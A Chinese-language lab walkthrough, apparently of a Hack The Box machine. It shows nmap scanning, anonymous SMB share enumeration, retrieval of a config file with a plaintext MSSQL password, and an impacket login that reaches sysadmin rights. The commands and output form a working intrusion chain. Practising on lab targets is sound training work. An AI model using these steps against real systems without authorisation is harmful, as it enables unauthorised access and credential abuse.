对靶机进行扫描`nmap -A 10.10.10.27`

![](nmap.png)

1. 445/tcp端口,用于Windows系统的共享文件夹

2. 1433/tcp端口,用于MSSQL端口

---

首先对445端口的共享文件夹进行查看

`smbclient -N -L 10.10.10.27`

![](smbclient.png)

尝试对文件夹内的内容进行读取

```bash
➜  ~ smbclient -N \\\\10.10.10.27\\ADMIN$
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
tree connect failed: NT_STATUS_ACCESS_DENIED
➜  ~ smbclient -N \\\\10.10.10.27\\C$    
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
tree connect failed: NT_STATUS_ACCESS_DENIED
➜  ~ smbclient -N \\\\10.10.10.27\\IPC$
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit
➜  ~ smbclient -N \\\\10.10.10.27\\backups
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 20:20:57 2020
  ..                                  D        0  Mon Jan 20 20:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020

                10328063 blocks of size 4096. 8259343 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit
➜  ~ 
```

在`backups`文件夹下有一个`prod.dtsConfig`文件,其内容为

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

可以知道用户名为`ARCHETYPE\sql_svc`,而密码为`M3g4c0rp123`

用[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)下的`mssqlclient.py`进行数据库连接

`python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`注意用户名使用的是`/`(看了write up才知道...)

用`SELECT IS_SRVROLEMEMBER('sysadmin')`查看当前权限

[https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples)

```SQL
IF IS_SRVROLEMEMBER ('sysadmin') = 1  
   print 'Current user''s login is a member of the sysadmin role'  
ELSE IF IS_SRVROLEMEMBER ('sysadmin') = 0  
   print 'Current user''s login is NOT a member of the sysadmin role'  
ELSE IF IS_SRVROLEMEMBER ('sysadmin') IS NULL  
   print 'ERROR: The server role specified is not valid.';
```

![](sysadmin.png)

当前权限为`sysadmin`

